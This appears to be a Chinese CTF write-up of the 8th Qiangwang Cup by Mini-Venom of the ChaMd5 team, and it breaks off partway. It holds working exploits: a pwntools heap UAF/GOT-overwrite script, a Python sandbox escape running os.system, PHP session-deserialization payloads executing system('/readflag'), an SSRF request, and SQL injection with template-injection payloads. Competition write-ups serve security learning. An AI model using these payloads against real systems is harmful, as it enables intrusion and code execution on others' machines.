---
title: 第八届强网杯 writeup by Mini-Venom
url: https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247511392&idx=1&sn=e4869a6794af62d5aaef55bc62e3742d&chksm=e89d85b8dfea0caeb1d77f1457f7283e96bce90f70fe8a882f4d814cf5002135e83c90cd9ece&scene=58&subscene=0#rd
source: ChaMd5安全团队
date: 2024-11-06
fetch_date: 2025-10-06T19:19:55.306985
---

# 第八届强网杯 writeup by Mini-Venom

![cover_image](https://mmbiz.qpic.cn/sz_mmbiz_jpg/PUubqXlrzBQ2a7YgJtdH27U2KXyQ8Rx6zA4ia6yL84AjCs3CpN3ryKgS2lXwpM5fibTQOibubTAiam0Gouibv6icXQEA/0?wx_fmt=jpeg)

# 第八届强网杯 writeup by Mini-Venom

原创

Mini-Venom

ChaMd5安全团队

> > 招新小广告CTF组诚招re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱
> >
> > admin@chamd5.org(带上简历和想加入的小组)

## Pwn

### baby\_heap

任意地址写，攻击libc中的got表
uaf，泄露出libc\_base利用任意地址写攻击

```
from pwn import*
from struct import pack
import ctypes
#from LibcSearcher import *
from ae64 import AE64
def bug():
        gdb.attach(p)
        pause()
def s(a):
        p.send(a)
def sa(a,b):
        p.sendafter(a,b)
def sl(a):
        p.sendline(a)
def sla(a,b):
        p.sendlineafter(a,b)
def r(a):
        p.recv(a)
#def pr(a):
        #print(p.recv(a))
def rl(a):
        return p.recvuntil(a)
def inter():
        p.interactive()
def get_addr64():
        return u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))
def get_addr32():
        return u32(p.recvuntil("\xf7")[-4:])
def get_sb():
        return libc_base+libc.sym['system'],libc_base+libc.search(b"/bin/sh\x00").__next__()
def get_hook():
        return libc_base+libc.sym['__malloc_hook'],libc_base+libc.sym['__free_hook']
li = lambda x : print('\x1b[01;38;5;214m' + x + '\x1b[0m')
ll = lambda x : print('\x1b[01;38;5;1m' + x + '\x1b[0m')

#context(os='linux',arch='i386',log_level='debug')
context(os='linux',arch='amd64',log_level='debug')
libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
#libc=ELF('/root/glibc-all-in-one/libs/2.35-0ubuntu3.8_amd64/libc.so.6')
#libc=ELF('/lib/i386-linux-gnu/libc.so.6')
#libc=ELF('libc-2.23.so')
#libc=ELF('/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc.so.6')
#libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
elf=ELF('./pwn')
#p=remote('',)
p = process('./pwn')

def malloc(size):
    sla(': ','1')
    sla('e ',str(size))

def free(idx):
    sla(': ', '2')
    sla(': ', str(idx))

def show(idx):
    sla(': ', '4')
    sla(': \n', str(idx))
    rl('here \n')

malloc(0x700)
malloc(0x10)
free(1)
show(1)
libc_base = u64(p.recv(8))-0x21ace0
li(hex(libc_base))
got = libc_base + 0x00000000021A118
sla(': ', '0')
s(p64(got))
s(p64(libc_base+libc.symbols['puts']))
sla(': ', '5')
sl('2')

inter()
```

## Web:

### PyBlockly

特殊字符绕一下

```
def convert_to_chinese_unicode(input_string):
    symbol_map = {
        '-': '\\uFF0D',
        '.': '\\uff0e',
        '/': '\\uff0f',
        '=': '\\uff1d',
        '>': '\\uff1e',
    }

    converted_string = []
    for char in input_string:
        if char in symbol_map:
            converted_string.append(symbol_map[char])
        else:
            converted_string.append(char)

    return ''.join(converted_string)

if __name__ == "__main__":
    input_string = input("input: ")
    result = convert_to_chinese_unicode(input_string)
    print("output:", result)
```

Suid 提权

```
POST /blockly_json HTTP/1.1
Host: eci-2ze51q7dfugzg8ukbu2u.cloudeci1.ichunqiu.com:5000
Content-Length: 287
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: */*
Content-Type: application/json
Origin: http://eci-2ze51q7dfugzg8ukbu2u.cloudeci1.ichunqiu.com:5000
Referer: http://eci-2ze51q7dfugzg8ukbu2u.cloudeci1.ichunqiu.com:5000/
Accept-Encoding: gzip, deflate
Accept-Language: en,zh;q=0.9,zh-CN;q=0.8
Connection: close

{"blocks":{"languageVersion":0,"blocks":[{"type":"text","id":"jnp.zOdZ8Lu(1#;d.n?p","x":146,"y":57,"fields":{"TEXT":"‘；＿＿builtins＿＿．len ＝ lambda x： 2\n＿＿import＿＿（＂os＂）．system（＂find ／ －perm －u＝s －type f 2＞／dev／null＂）；‘"}}]}}
```

使用dd

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBQ2a7YgJtdH27U2KXyQ8Rx6qjiccDhnj59IPJvQHodU3UPY9x8199gaLunibyywNnib4vAicqN2JckArw/640?wx_fmt=png&from=appmsg)

### platform

dirsearch扫一扫，扫出源码，审计源码，入口点是依靠过滤函数SessionManager的黑名单替换为空来进行session反序列化逃逸，伪造序列化链，攻击点在notouchitsclass函数的eval函数执行data数据。

```
username=fewww&password[]=systemsystemeval&password[]=";i:1;s:7:"fewww";}a|O:15:"notouchitsclass":1:{s:4:"data";s:10:"phpinfo();
```

一开始重定向后没有phpinfo界面，以为要去读取session临时文件，怎么试都不行，后来发现重定向两次就可以了，然后查看根目录，发现可执行文件/readflag，执行就完了。

```
username=fewww&password[]=systemsystemeval&password[]=";i:1;s:7:"fewww";}a|O:15:"notouchitsclass":1:{s:4:"data";s:20:"system('/readflag');
```

### proxy

```
POST /v2/api/proxy HTTP/1.1
Host: 47.93.55.85:32908
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en,zh;q=0.9,zh-CN;q=0.8
Connection: close
Content-Type: application/json
Content-Length: 106

{"url":"http://127.0.0.1:8769/v1/api/flag","method":"POST","body":"","headers":{},"follow_redirects":true}
```

### snake

bfs搜索找路径

```
import requests
import time
from collections import deque

url = "http://eci-2ze816q8joakpaau8x27.cloudeci1.ichunqiu.com:5000/move"

DIRECTIONS = {
    "UP": {"direction": "UP"},
    "DOWN": {"direction": "DOWN"},
    "LEFT": {"direction": "LEFT"},
    "RIGHT": {"direction": "RIGHT"}
}

OPPOSITE_DIRECTION = {
    "UP": "DOWN",
    "DOWN": "UP",
    "LEFT": "RIGHT",
    "RIGHT": "LEFT"
}

GRID_SIZE = 19

def send_direction(direction):
    proxy = {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}
    cookie = {"session":"eyJ1c2VybmFtZSI6IjEyMyJ9.ZyY4kA.fMuYYNivo6MuqkmjHkwtjG74D5s"}
    response = requests.post(url, json=DIRECTIONS[direction],cookies=cookie,proxies=proxy)
    return response.json()

def get_next_position(position, direction):
    x, y = position
    if direction == "UP":
        return x, y - 1
    elif direction == "DOWN":
        return x, y + 1
    elif direction == "LEFT":
        return x - 1, y
    elif direction == "RIGHT":
        return x + 1, y

def bfs(snake_head, food, snake_body):
    queue = deque([(snake_head, [])])
    visited = set(snake_body)

    while queue:
        position, path = queue.popleft()

        if position == food:
            return path[0] if path else None

        for direction in ["UP", "DOWN", "LEFT", "RIGHT"]:
            next_position = get_next_position(position, direction)

            if 0 <= next_position[0] <= GRID_SIZE and 0 <= next_position[1] <= GRID_SIZE:
                if next_position not in visited:
                    visited.add(next_position)
                    queue.append((next_position, path + [direction]))

    return None

def play_game():
    direction = "RIGHT"
    game_status = send_direction(direction)

    while game_status["status"] == "ok":
        snake_head = game_status["snake"][0]
        food = game_status["food"]
        snake_body = set(tuple(pos) for pos in game_status["snake"])

        next_direction = bfs(snake_head, tuple(food), snake_body)

        if next_direction:
            game_status = send_direction(next_direction)
            direction = next_direction
            print(f"Direction: {next_direction}, Game Status: {game_status}")
        else:
            print("无法找到安全路径，游戏结束")
            break

if __name__ == "__main__":
    play_game()
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/PUubqXlrzBQ2a7YgJtdH27U2KXyQ8Rx62E3ubrlg13VNVib6icAujicyXU5YkQKc3u43peCyAmFib4V020wbSMj8MA/640?wx_fmt=png&from=appmsg)

```
GET /snake_win?username=123%27%20union%20select%204,2,%22{{().__class__.__bases__[0].__subclasses__()}}%22--+ HTTP/1.1
Host: eci-2zecsejgdlggc78x72g5.cloudeci1.ichunqiu.com:5000
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: en,zh;q=0.9,zh-CN;q=0.8
Connection: close
```

定位一下\_wrap\_close

...